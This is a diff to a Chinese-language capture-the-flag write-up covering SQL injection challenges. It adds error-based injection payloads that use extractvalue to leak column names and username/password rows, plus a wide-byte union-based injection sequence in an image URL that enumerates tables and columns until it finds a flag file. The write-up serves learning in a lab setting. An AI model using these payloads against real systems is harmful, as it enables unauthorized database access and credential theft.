@@ -93,9 +93,51 @@ procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, ta
 
 `user`二级制`0x75736572`
 
+由于`group_concat`得出的结果有长度限制，只能limit一个字段一个字段泄露。
 ```
-procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, column_name, 0x7e) from information_schema.columns where table_name=0x75736572 ))),1)%23&num=1
+procedure analyse(extractvalue(rand(), concat(0x3a,(select concat(0x7e, column_name, 0x7e) from information_schema.columns where table_name=0x75736572 limit 2,1))),1)%23&num=1
 ```
+
+	四个字段 id,username,password,lastloginIP
+
+获取各个字段
+```
+procedure analyse(extractvalue(rand(), concat(0x3a,(select concat(0x7e,username,0x3a, password, 0x7e) from user limit 2,1))),1)%23&num=1
+```
+
+	XPATH syntax error: ':~flag:myflagishere~'
+
+## 邂逅
+
+从图片请求入手，不能在浏览器通过正常请求测试是否有注入点，应当在BurpSuite中操作。
+
+```
+/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27
+```
+
+```
+# 判断列，直到5报错
+/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20order%20by%205%23
+# 判断显示位, 回显3
+/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,3,4%20%23
+# 获取当前数据库的表名article,pic 
+/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(distinct+table_name)),4%20%20from%20information_schema.tables%20where%20table_schema=database()%23
+# 查找article的字段，'article'=>0x61727469636c65
+## 得到 id,title,content,others 
+/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(column_name)),4%20%20from%20information_schema.columns%20where%20table_name=0x61727469636c65%23
+## 得到数据
+/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(title,content),0x3a),4%20%20from%20article%23
+未得到有用信息
+
+# 查找pic的字段，'pic'=>0x706963
+## 得到 id,picname,data,text 
+/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(column_name)),4%20%20from%20information_schema.columns%20where%20table_name=0x706963%23
+## 得到数据
+/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(picname,0x7e),0x3a),4%20%20from%20pic%23
+得到 dog1.jpg~,cat1.jpg~,flagishere_askldjfklasjdfl.jpg~:
+
+```
+在浏览器访问flagishere_askldjfklasjdfl.jpg即可得到flag。
 
 
 ## 7题
